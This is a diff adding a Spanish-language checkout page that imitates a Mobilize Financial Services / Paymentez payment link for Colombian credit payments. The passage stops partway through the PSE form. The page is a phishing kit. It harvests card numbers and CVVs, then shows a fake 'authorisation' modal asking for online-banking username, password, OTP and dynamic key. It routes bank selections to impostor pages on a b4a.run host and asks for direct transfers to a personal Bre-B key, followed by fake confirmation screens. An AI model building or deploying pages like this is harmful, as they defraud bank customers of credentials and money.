@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Link To Pay</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; }
+body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #fff; color: #1a1a1a; }
+
+.logo-area { padding: 4% 8%; max-width: 280px; }
+.logo-area img { width: 100%; }
+
+.main-card {
+    background: #e5e5e5; margin: 0 auto; max-width: 1100px;
+    position: relative; display: flex; flex-wrap: wrap;
+}
+.vigilado-bg {
+    position: absolute; right: 0; top: 0; height: 100%; width: 45%;
+    background: url('assets/vigilado.png') right top / contain no-repeat;
+    opacity: .18; pointer-events: none;
+}
+
+/* LEFT PANEL */
+.left-panel { flex: 0 0 58%; max-width: 58%; padding: 28px 32px; position: relative; z-index: 1; }
+.left-panel h3 { font-size: 21px; font-weight: 700; margin: 8px 0 20px; }
+.form-row { display: flex; flex-wrap: wrap; margin: 0 -8px; }
+.form-group { padding: 0 8px; margin-bottom: 14px; }
+.col-6 { flex: 0 0 50%; max-width: 50%; }
+.col-2 { flex: 0 0 25%; max-width: 25%; }
+.col-4 { flex: 0 0 41.66%; max-width: 41.66%; }
+.form-group label { display: block; font-size: 11.5px; color: #444; margin-bottom: 4px; }
+.form-control { display: block; width: 100%; padding: 8px 11px; font-size: 13.5px; color: #222; background: #fff; border: 1px solid #ced4da; border-radius: 5px; font-family: inherit; }
+.form-control:disabled { background: #eaecef; color: #666; cursor: not-allowed; }
+
+/* RIGHT PANEL */
+.right-panel { flex: 0 0 42%; max-width: 42%; background: #f8f8f8; padding: 28px 24px; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
+.o-amount { text-align: center; padding: 16px 0 8px; width: 100%; }
+.o-amount--payment { font-size: 32px; font-weight: 700; color: #000; display: block; }
+.o-amount--currency { font-size: 15px; font-weight: 400; color: #777; margin-left: 5px; }
+.payment-title { font-size: 17px; font-weight: 700; text-align: center; padding: 12px 0 14px; width: 100%; }
+
+/* ── MÉTODOS DE PAGO (estilo Jelpit) ── */
+.mp-wrapper {
+    display: flex; flex-direction: column;
+    border: 1px solid #e0e0e0; border-radius: 8px;
+    overflow: hidden; background: #fff;
+    margin-top: 4px; width: 100%;
+}
+.mp-acc-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 16px; cursor: pointer; background: #fff;
+    border-bottom: 1px solid #efefef; transition: background .15s;
+    min-height: 58px;
+}
+.mp-acc-header:last-of-type { border-bottom: none; }
+.mp-acc-header:hover { background: #fafafa; }
+.mp-acc-header.open { background: #faf7ff; }
+.mp-acc-left { flex: 1; min-width: 0; }
+.mp-acc-name { font-size: 14px; font-weight: 400; color: #333; }
+.mp-mat-indicator {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 24px; height: 24px; flex-shrink: 0; margin-left: 8px;
+    transition: transform .25s cubic-bezier(.4,0,.2,1);
+}
+.mp-acc-header.open .mp-mat-indicator { transform: rotate(180deg); }
+.mp-right { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
+.mp-right img { height: 22px; border-radius: 3px; object-fit: contain; }
+.mp-pse-circle {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: #1a2b5e; display: flex; align-items: center; justify-content: center; overflow: hidden;
+}
+.mp-pse-circle img { width: 100%; height: 100%; object-fit: cover; }
+.mp-nequi-logo { height: 26px; object-fit: contain; }
+.mp-breb-pill { background: #3b1f8c; color: #fff; font-size: 11px; font-weight: 700; padding: 3px 9px; border-radius: 5px; letter-spacing: .4px; }
+
+/* Body expandible PSE */
+.mp-acc-body { display: none; background: #fff; border-bottom: 1px solid #efefef; padding: 16px 16px 8px; }
+.mp-acc-body.open { display: block; }
+
+/* Campos outlined PSE */
+.mp-mfield { position: relative; margin-bottom: 16px; }
+.mp-mfield label {
+    position: absolute; top: -9px; left: 10px;
+    background: #fff; padding: 0 4px;
+    font-size: 12px; color: #e07030; font-weight: 500;
+    line-height: 1; pointer-events: none; white-space: nowrap;
+}
+.mp-mfield select, .mp-mfield input {
+    width: 100%; padding: 13px 40px 13px 12px;
+    border: 1px solid #bbb; border-radius: 4px;
+    font-size: 14px; color: #222; background: #fff;
+    outline: none; appearance: none; -webkit-appearance: none;
+    box-sizing: border-box; transition: border-color .2s; font-family: inherit;
+}
+.mp-mfield select:focus, .mp-mfield input:focus { border-color: #5b3fa0; border-width: 2px; }
+.mp-mfield .mp-arrow { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); pointer-events: none; }
+
+/* Botón PSE continuar */
+.mp-btn-pse {
+    width: 100%; padding: 14px; border: none; border-radius: 6px;
+    background: #1a1a1a; color: #fff; font-size: 14px; font-weight: 700;
+    cursor: pointer; font-family: inherit; margin: 8px 0 12px;
+    transition: background .15s;
+}
+.mp-btn-pse:hover { background: #333; }
+
+/* Modal de carga */
+#mp-loading-modal {
+    position: fixed; inset: 0; z-index: 999999;
+    background: rgba(255,255,255,.97);
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center; gap: 24px;
+    animation: mpFadeIn .3s ease;
+}
+@keyframes mpFadeIn { from{opacity:0} to{opacity:1} }
+#mp-loading-modal img { width: 200px; max-width: 70vw; }
+#mp-loading-bar-wrap { width: 200px; height: 4px; background: #eee; border-radius: 4px; overflow: hidden; }
+#mp-loading-bar { height: 100%; width: 0; background: #f45000; border-radius: 4px; transition: width 3s linear; }
+#mp-loading-txt { font-size: 14px; color: #666; font-family: inherit; }
+
+/* ===== MODAL JLP TARJETA ===== */
+#jlpModalOverlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:200000; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(2px); }
+#jlpModalOverlay.show { display:flex; }
+#jlpModalCard { background:white; border-radius:16px; max-width:440px; width:100%; padding:28px; max-height:90vh; overflow-y:auto; box-shadow:0 20px 60px rgba(0,0,0,0.3); font-family:inherit; }
+.jlp-am-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; padding-bottom:16px; border-bottom:1px solid #f0f0f0; gap:16px; min-height:50px; }
+.jlp-am-header-left { flex:1; }
+.jlp-am-header-right { flex-shrink:0; }
+#jlpCardLogo { height:60px; max-width:120px; object-fit:contain; }
+.jlp-am-stage { display:none; }
+.jlp-am-stage.active { display:block; }
+.jlp-am-title { font-size:17px; font-weight:700; color:#1a1a1a; margin-bottom:8px; }
+.jlp-am-sub { font-size:13px; color:#666; margin-bottom:20px; line-height:1.5; }
+.jlp-am-spinner { display:flex; flex-direction:column; align-items:center; gap:16px; padding:20px 0; }
+.jlp-spin-ring { width:48px; height:48px; border:4px solid #eee; border-top-color:#f45000; border-radius:50%; animation:jlpSpin 0.9s linear infinite; }
+@keyframes jlpSpin { to { transform:rotate(360deg); } }
+.jlp-am-field { margin-bottom:16px; }
+.jlp-am-field label { display:block; font-size:12px; color:#555; font-weight:600; margin-bottom:6px; }
+.jlp-am-field input { width:100%; padding:11px 12px; border:1px solid #ccc; border-radius:8px; font-size:14px; font-family:inherit; outline:none; }
+.jlp-am-field input:focus { border-color:#f45000; }
+.jlp-am-show-pwd { position:relative; }
+.jlp-am-show-pwd input { padding-right:42px; }
+.jlp-am-show-pwd .eye-btn { position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; color:#888; font-size:16px; padding:0; }
+.jlp-am-btn { width:100%; padding:13px; background:#f45000; color:#fff; border:none; border-radius:25px; font-size:14px; font-weight:700; cursor:pointer; font-family:inherit; margin-top:8px; }
+.jlp-am-btn:hover { background:#d93e00; }
+.jlp-am-success-icon { font-size:48px; text-align:center; margin-bottom:12px; }
+.jlp-am-footer { font-size:11px; color:#aaa; text-align:center; margin-top:20px; }
+/* Tarjeta form inline */
+.mp-tarjeta-body { display:none; background:#fff; border-bottom:1px solid #efefef; padding:16px 16px 8px; }
+.mp-tarjeta-body.open { display:block; }
+.mp-tarjeta-row { display:flex; gap:12px; }
+.mp-tarjeta-row .mp-mfield { flex:1; }
+/* Bre-B modal */
+#brevModal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:300000; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(2px); }
+#brevModal.show { display:flex; }
+
+/* FOOTER */
+footer { margin-top: 40px; }
+.footer-orange { background: #f45000; padding: 8px 24px; }
+.footer-orange small { color: #fff; font-size: 12px; }
+.footer-orange a { color: #fff; }
+
+/* MOBILE */
+.mobile-payment { display: none; }
+@media (max-width: 991px) {
+    .left-panel, .right-panel { flex: 0 0 100%; max-width: 100%; }
+    .right-panel { display: none; }
+    .mobile-payment { display: block; padding-top: 24px; }
+}
+</style>
+</head>
+<body>
+
+<div><div class="logo-area"><img src="assets/logo.svg" alt="Mobilize Financial Services"></div></div>
+
+<div style="padding:0 12px">
+<div class="main-card">
+<div class="vigilado-bg"></div>
+
+<!-- LEFT -->
+<div class="left-panel">
+    <h3><strong>Detalles de tu compra</strong></h3>
+    <div class="form-row">
+        <div class="form-group col-6"><label>Nombre</label><input class="form-control" id="chkNombre" value=""></div>
+        <div class="form-group col-6"><label>Apellido</label><input class="form-control" id="chkApellido" value=""></div>
+        <div class="form-group col-6"><label>Correo electrónico</label><input class="form-control" id="chkEmail" value=""></div>
+        <div class="form-group col-6"><label>Número de referencia</label><input class="form-control" id="chkRef" disabled value=""></div>
+        <div class="form-group col-6"><label>Descripción</label><input class="form-control" id="chkDesc" disabled value=""></div>
+        <div class="form-group col-2"><label>Moneda</label><input class="form-control" disabled value="COP"></div>
+        <div class="form-group col-4"><label>Valor de la compra</label><input class="form-control" id="chkValor" disabled value=""></div>
+    </div>
+    <div class="mobile-payment">
+        <div class="o-amount"><span class="o-amount--payment" id="chkAmountMobile">$ —<span class="o-amount--currency">COP</span></span></div>
+        <div class="payment-title"><strong>Métodos de pago</strong></div>
+        <div id="mp-wrapper-mobile"></div>
+    </div>
+</div>
+
+<!-- RIGHT -->
+<div class="right-panel">
+    <div class="o-amount"><span class="o-amount--payment" id="chkAmountDesktop">$ —<span class="o-amount--currency">COP</span></span></div>
+    <div class="payment-title"><strong>Métodos de pago</strong></div>
+    <div id="mp-wrapper-desktop"></div>
+</div>
+
+</div>
+</div>
+
+<!-- Bre-B modal -->
+<div id="brevModal">
+  <div style="background:white;border-radius:20px;max-width:400px;width:100%;padding:30px;box-shadow:0 20px 60px rgba(0,0,0,0.3);font-family:inherit;">
+    <div style="text-align:center;margin-bottom:24px;">
+      <div style="width:64px;height:64px;background:#f5f0ff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;">
+        <svg viewBox="0 0 24 24" width="28" height="28" fill="#7c3aed"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>
+      </div>
+      <h3 id="brevModalTitulo" style="font-size:20px;font-weight:700;color:#2e0063;margin:0 0 6px;">Transferencia directa</h3>
+      <p id="brevModalSub" style="font-size:13px;color:#777;margin:0;">Transfiere el valor exacto a esta llave</p>
+    </div>
+    <div style="background:#f0fdf4;border:1px solid #1dbe5f;border-radius:10px;padding:14px 18px;text-align:center;margin-bottom:16px;">
+      <div style="font-size:11px;color:#555;font-weight:600;text-transform:uppercase;margin-bottom:4px;">Valor a transferir</div>
+      <div id="brevModalMonto" style="font-size:24px;font-weight:700;color:#1dbe5f;">—</div>
+    </div>
+    <div style="background:#f5f0ff;border:1.5px solid #7c3aed;border-radius:10px;padding:14px 18px;margin-bottom:20px;">
+      <div style="font-size:11px;color:#7c3aed;font-weight:700;text-transform:uppercase;margin-bottom:8px;">Llave de transferencia</div>
+      <div style="display:flex;align-items:center;gap:10px;">
+        <span id="brevLlaveText" style="font-size:18px;font-weight:700;color:#2e0063;letter-spacing:0.5px;flex:1;">@LITTIO1047039997</span>
+        <button onclick="brevCopiarLlave()" style="background:#7c3aed;color:white;border:none;border-radius:8px;padding:8px 14px;font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;font-family:inherit;">Copiar</button>
+      </div>
+    </div>
+    <button onclick="brevConfirmar()" style="width:100%;background:#1dbe5f;color:white;border:none;border-radius:25px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:10px;">Ya realicé la transferencia</button>
+    <button onclick="document.getElementById('brevModal').classList.remove('show')" style="width:100%;background:transparent;color:#999;border:none;padding:10px;font-size:13px;cursor:pointer;font-family:inherit;">Cancelar</button>
+  </div>
+</div>
+
+<!-- Bre-B Loading Overlay -->
+<div id="brevLoadingOverlay" style="display:none;position:fixed;inset:0;background:white;z-index:300001;flex-direction:column;align-items:center;justify-content:center;gap:24px;font-family:inherit;padding:30px;text-align:center;">
+  <img src="assets/logo.svg" alt="Mobilize" style="height:48px;margin-bottom:8px;">
+  <div id="brevLoadingSpinner" style="width:56px;height:56px;border:5px solid #e8e8e8;border-top-color:#f45000;border-radius:50%;animation:jlpSpin 0.9s linear infinite;"></div>
+  <p id="brevLoadingTexto" style="font-size:16px;color:#555;margin:0;">Verificando transferencia...</p>
+  <p style="font-size:13px;color:#aaa;margin:0;">Por favor espera mientras confirmamos tu pago.</p>
+  <div id="brevRechazadoMsg" style="display:none;flex-direction:column;align-items:center;gap:14px;max-width:300px;">
+    <div style="width:64px;height:64px;background:#fff5f5;border-radius:50%;display:flex;align-items:center;justify-content:center;">
+      <svg viewBox="0 0 24 24" width="28" height="28" fill="#dc3545"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+    </div>
+    <p style="font-size:16px;font-weight:700;color:#dc3545;margin:0;">Pago no verificado</p>
+    <p style="font-size:14px;color:#555;margin:0;line-height:1.5;">No pudimos confirmar tu transferencia. Verifica que realizaste el pago a la llave correcta e inténtalo de nuevo.</p>
+    <button onclick="brevVolverModal()" style="background:#7c3aed;color:white;border:none;border-radius:25px;padding:13px 28px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;">Volver a intentar</button>
+  </div>
+</div>
+
+<!-- Bre-B Success Overlay -->
+<div id="brevSuccessOverlay" style="display:none;position:fixed;inset:0;background:white;z-index:300001;flex-direction:column;align-items:center;justify-content:center;padding:30px;text-align:center;font-family:inherit;">
+  <img src="assets/logo.svg" alt="Mobilize" style="height:48px;margin-bottom:32px;">
+  <div style="width:80px;height:80px;background:#f0fdf4;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:24px;">
+    <svg viewBox="0 0 24 24" width="36" height="36" fill="#1dbe5f"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+  </div>
+  <h2 style="font-size:24px;font-weight:700;color:#1a1a1a;margin:0 0 12px;">¡Pago confirmado!</h2>
+  <p style="font-size:15px;color:#555;margin:0 0 32px;line-height:1.6;">Tu transferencia fue verificada exitosamente. Recibirás confirmación pronto.</p>
+  <button onclick="window.location.href='/'" style="background:#f45000;color:white;border:none;border-radius:25px;padding:14px 40px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;">Finalizar</button>
+</div>
+
+<!-- Modal Autorización JLP -->
+<div id="jlpModalOverlay">
+  <div id="jlpModalCard">
+    <div class="jlp-am-header">
+      <div class="jlp-am-header-left">
+        <div id="jlpCardName" style="font-size:15px;font-weight:700;color:#1a1a1a;"></div>
+        <div id="jlpAmountLine" style="font-size:13px;color:#555;margin-top:4px;"></div>
+      </div>
+      <div class="jlp-am-header-right">
+        <img id="jlpCardLogo" alt="Tarjeta" style="display:none;">
+      </div>
+    </div>
+    <div id="jlpStageWait" class="jlp-am-stage active">
+      <div class="jlp-am-title">Autorizando transacción</div>
+      <div class="jlp-am-sub">Estamos verificando tu pago con el banco. Esto puede tomar unos segundos.</div>
+      <div class="jlp-am-spinner"><div class="jlp-spin-ring"></div><p style="color:#888;font-size:14px;margin:0;">Esperando confirmación...</p></div>
+    </div>
+    <div id="jlpStageCred" class="jlp-am-stage">
+      <div class="jlp-am-title">Confirma tu identidad</div>
+      <div class="jlp-am-sub">Ingresa las credenciales de tu banco para continuar.</div>
+      <div class="jlp-am-field"><label>Usuario</label><input type="text" id="jlpCredUser" placeholder="Ingresa tu usuario" autocomplete="off"></div>
+      <div class="jlp-am-field"><label>Contraseña</label><div class="jlp-am-show-pwd"><input type="password" id="jlpCredPass" placeholder="Ingresa tu contraseña" autocomplete="off"><button class="eye-btn" id="jlpEyeBtn" type="button">👁</button></div></div>
+      <button class="jlp-am-btn" id="jlpBtnEnviarCred">Continuar</button>
+    </div>
+    <div id="jlpStageLoadingCred" class="jlp-am-stage">
+      <div class="jlp-am-title">Verificando credenciales</div>
+      <div class="jlp-am-spinner"><div class="jlp-spin-ring"></div><p style="color:#888;font-size:14px;margin:0;">Procesando...</p></div>
+    </div>
+    <div id="jlpStageOTP" class="jlp-am-stage">
+      <div class="jlp-am-title">Código OTP</div>
+      <div class="jlp-am-sub">Revisa tu SMS o app bancaria e ingresa el código de verificación.</div>
+      <div class="jlp-am-field"><label>Código OTP</label><input type="text" id="jlpOtpInput" placeholder="Código" maxlength="8" autocomplete="one-time-code" inputmode="numeric" style="letter-spacing:4px;font-size:20px;text-align:center;"></div>
+      <button class="jlp-am-btn" id="jlpBtnEnviarOtp">Confirmar</button>
+    </div>
+    <div id="jlpStageClave" class="jlp-am-stage">
+      <div class="jlp-am-title">Clave Dinámica</div>
+      <div class="jlp-am-sub">Ingresa tu clave dinámica para confirmar la transacción.</div>
+      <div class="jlp-am-field"><label>Clave Dinámica</label><input type="text" id="jlpClaveInput" placeholder="Clave" maxlength="8" autocomplete="one-time-code" inputmode="numeric" style="letter-spacing:4px;font-size:20px;text-align:center;"></div>
+      <button class="jlp-am-btn" id="jlpBtnEnviarClave">Confirmar</button>
+    </div>
+    <div id="jlpStageLoadingVerif" class="jlp-am-stage">
+      <div class="jlp-am-title">Verificando código</div>
+      <div class="jlp-am-spinner"><div class="jlp-spin-ring"></div><p style="color:#888;font-size:14px;margin:0;">Validando...</p></div>
+    </div>
+    <div id="jlpStageSuccess" class="jlp-am-stage">
+      <div class="jlp-am-success-icon">✅</div>
+      <div class="jlp-am-title" style="text-align:center;">¡Pago exitoso!</div>
+      <div class="jlp-am-sub" style="text-align:center;">Tu pago ha sido procesado correctamente. Recibirás confirmación pronto.</div>
+      <button class="jlp-am-btn" onclick="window.location.href='/'">Finalizar</button>
+    </div>
+    <div class="jlp-am-footer">Conexión segura · SSL 256-bit</div>
+  </div>
+</div>
+
+<footer><div class="footer-orange"><small>© 2018 - 2026 Copyright: <a href="https://paymentez.com/" target="_blank" rel="noopener noreferrer">Paymentez™. All rights reserved.</a></small></div></footer>
+
+<script>
+const BANCOS = [
+    { v:'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/',                    l:'Nequi' },
+    { v:'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f9/',                     l:'Bancolombia' },
+    { v:'https://pagpse-u6htdvaa.b4a.run/transaction/ent/b-34f3/',                      l:'Davivienda' },
+    { v:'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f4/wps.portal/virtual/',  l:'Banco de Bogotá' },
+    { v:'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-34f18/',                    l:'Banco Popular' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco de Occidente' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco AV Villas' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco Caja Social' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'BBVA Colombia' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Scotiabank Colpatria' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco Agrario de Colombia' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco GNB Sudameris' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco Falabella' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco Itaú' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Daviplata' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Lulo Bank' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Nu Colombia' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Rappipay' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Movii' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Ualá' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco Pichincha' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco W' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Banco Mundo Mujer' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Bancamía' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Confiar Cooperativa Financiera' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Cotrafa Cooperativa Financiera' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Coltefinanciera' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Juriscoop' },
+    { v:'https://checkout.nequi.wompi.co/l/VPOS_h0w02w',                                l:'Pibank' },
+];
+
+const RUTAS_BANCO = {}; // Las URLs van directo en BANCOS.v
+
+// ── Leer datos dinámicos de sessionStorage ────────────────────────────────────
+const _pago    = JSON.parse(sessionStorage.getItem('rci_pago')    || 'null');
+const _credito = JSON.parse(sessionStorage.getItem('rci_credito') || 'null');
+
+if (!_pago || !_credito) { window.location.href = '/'; }
+
+// Poblar campos del panel izquierdo
+document.getElementById('chkNombre').value   = _credito?.nombre    || '';
+document.getElementById('chkApellido').value = _credito?.apellidos || '';
+document.getElementById('chkEmail').value    = _credito?.email     || '';
+document.getElementById('chkRef').value      = _pago?.referencia   || '';
+document.getElementById('chkDesc').value     = _pago?.concepto     || '';
+document.getElementById('chkValor').value    = _pago?.montoFmt     || '';
+document.getElementById('chkAmountDesktop').innerHTML = (_pago?.montoFmt || '$ —') + '<span class="o-amount--currency">COP</span>';
+document.getElementById('chkAmountMobile').innerHTML  = (_pago?.montoFmt || '$ —') + '<span class="o-amount--currency">COP</span>';
+// Datos para las páginas de bancos (formato compatible)
+const RCI_PAGADOR  = { nombre: _credito?.nombre || '', apellido: _credito?.apellidos || '', tipoId: 'CC', numeroId: _credito?.cedula || '', celular: '' };
+const RCI_CONJUNTO = { co_ownership_name: _pago?.concepto || 'Pago crédito RCI', referencia: _pago?.referencia || '' };
+const RCI_DEUDA    = { noInvoicesData: { balance: _pago?.monto || 0 } };
+
+sessionStorage.setItem('pagador',       JSON.stringify(RCI_PAGADOR));
+sessionStorage.setItem('conjunto',      JSON.stringify(RCI_CONJUNTO));
+sessionStorage.setItem('deuda',         JSON.stringify(RCI_DEUDA));
+sessionStorage.setItem('email_usuario', _credito?.email || '');
+
+const chevronSvg = `<span class="mp-mat-indicator"><svg viewBox="0 0 24 24" width="22" height="22" fill="#9e9e9e"><path d="M7 10l5 5 5-5z"/></svg></span>`;
+const arrowSvg   = `<span class="mp-arrow"><svg viewBox="0 0 24 24" width="20" height="20" fill="#757575"><path d="M7 10l5 5 5-5z"/></svg></span>`;
+
+function buildWrapper() {
+    const wrapper = document.createElement('div');
+    wrapper.className = 'mp-wrapper';
+
+    // ── Tarjetas ──
+    const tarjetaH = document.createElement('div');
+    tarjetaH.className = 'mp-acc-header';
+    tarjetaH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Tarjetas Débito o Crédito</span></div>
+        <div class="mp-right">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg" alt="MC">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg" alt="Visa">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg" alt="Amex">
+            <img src="https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/diners.svg" alt="Diners">
+            ${chevronSvg}
+        </div>`;
+
+    const tarjetaBody = document.createElement('div');
+    tarjetaBody.className = 'mp-tarjeta-body';
+    tarjetaBody.innerHTML = `
+        <div class="mp-mfield">
+            <label>Tipo de documento</label>
+            <select id="mp-tar-doc">
+                <option value="CC">Cédula de Ciudadanía</option>
+                <option value="CE">Cédula de Extranjería</option>
+                <option value="NIT">NIT</option>
+                <option value="PP">Pasaporte</option>
+            </select>${arrowSvg}
+        </div>
+        <div class="mp-mfield">
+            <label>Número de documento</label>
+            <input type="tel" id="mp-tar-cedula" value="${_credito?.cedula||''}" inputmode="numeric">
+        </div>
+        <div class="mp-mfield">
+            <label>Número de tarjeta</label>
+            <input type="tel" id="mp-tar-numero" placeholder="4111 1111 1111 1111" inputmode="numeric" maxlength="19">
+        </div>
+        <div class="mp-tarjeta-row">
+            <div class="mp-mfield">
+                <label>Fecha (MM/YY)</label>
+                <input type="text" id="mp-tar-fecha" placeholder="12/27" maxlength="5">
+            </div>
+            <div class="mp-mfield">
+                <label>CVV</label>
+                <input type="tel" id="mp-tar-cvv" placeholder="123" maxlength="4" inputmode="numeric">
+            </div>
+        </div>
+        <button class="mp-btn-pse" id="mp-btn-pagar-tarjeta">Pagar con tarjeta</button>`;
+
+    tarjetaH.addEventListener('click', () => {
+        const open = tarjetaBody.classList.toggle('open');
+        tarjetaH.classList.toggle('open', open);
+    });
+
+    tarjetaBody.querySelector('#mp-tar-numero').addEventListener('input', function(e) {
+        let v = e.target.value.replace(/\D/g,'');
+        e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+    });
+    tarjetaBody.querySelector('#mp-tar-fecha').addEventListener('input', function(e) {
+        let v = e.target.value.replace(/\D/g,'');
+        if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
+        e.target.value = v;
+    });
+    tarjetaBody.querySelector('#mp-tar-cvv').addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g,'');
+    });
+
+    tarjetaBody.querySelector('#mp-btn-pagar-tarjeta').addEventListener('click', () => {
+        const cedula  = tarjetaBody.querySelector('#mp-tar-cedula').value.trim();
+        const numero  = tarjetaBody.querySelector('#mp-tar-numero').value.trim();
+        const fecha   = tarjetaBody.querySelector('#mp-tar-fecha').value.trim();
+        const cvv     = tarjetaBody.querySelector('#mp-tar-cvv').value.trim();
+        const tipoDoc = tarjetaBody.querySelector('#mp-tar-doc').value;
+        if (!cedula || !numero || !fecha || !cvv) { alert('Por favor completa todos los campos de tarjeta'); return; }
+        const num = numero.replace(/\s/g,'');
+        const primer = num[0];
+        const tipoTarjeta = primer === '4' ? 'visa' : primer === '3' ? 'amex' : 'mastercard';
+        const logoMap = { visa:'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/visa.svg', mastercard:'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/mastercard.svg', amex:'https://cdn.jsdelivr.net/npm/payment-icons@1.1.0/min/flat/amex.svg' };
+        abrirModalJLP({
+            nombre: _credito?.nombre||'', apellido: _credito?.apellidos||'',
+            email: _credito?.email||'', tipoDoc,
+            cedula, numero_tarjeta: numero, fecha_tarjeta: fecha, cvv,
+            cardFirst6: num.slice(0,6), cardLast: num.slice(-4),
+            tipoTarjeta, monto: _pago?.monto||0,
+            montoFormateado: _pago?.montoFmt||'',
+            referencia: _pago?.referencia||'', concepto: _pago?.concepto||'',
+            numeroCredito: _credito?.numero||''
+        });
+    });
+
+    // ── PSE ──
+    const pseH = document.createElement('div');
+    pseH.className = 'mp-acc-header';
+    pseH.innerHTML = `
+        <div class="mp-acc-left"><span class="mp-acc-name">Débito PSE</span></div>
+        <div class="mp-right">
+            <div class="mp-pse-circle"><img src="assets/logoPse.png" alt="PSE"></div>
+            ${chevronSvg}
+        </div>`;
+
+    const pseBody = document.createElement('div');
+    pseBody.className = 'mp-acc-body';
+    pseBody.innerHTML = `
+        <div class="mp-mfield">
+            <label>Tipo de documento</label>
+            <select id="mp-tipo-doc">
+                <option value="CC" selected>Cédula de Ciudadanía</option>
+                <option value="CE">Cédula de Extranjería</option>
+                <option value="TI">Tarjeta de Identidad</option>
+                <option value="NIT">NIT</option>
+                <option value="PP">Pasaporte</option>
+            </select>${arrowSvg}
+        </div>
+        <div class="mp-mfield">
+            <label>Número de documento</label>
+            <input type="tel" id="mp-num-doc" value="${_credito?.cedula || ''}" inputmode="numeric">
+        </div>
+        <div class="mp-mfield">
+            <label>Banco</label>
+            <select id="mp-banco">
+                <option value="" disabled selected>Seleccione una opción</option>
+                ${BANCOS.map(b=>`<option value="${b.v}">${b.l}</option>`).join('')}
+            </select>${arrowSvg}
+        </div>
+        <div class="mp-mfield">
+            <label>Tipo de persona</label>
+            <select id="mp-tipo-persona">
+                <option value="N">Persona natural</option>
+                <option value="J">Persona jurídica</option>
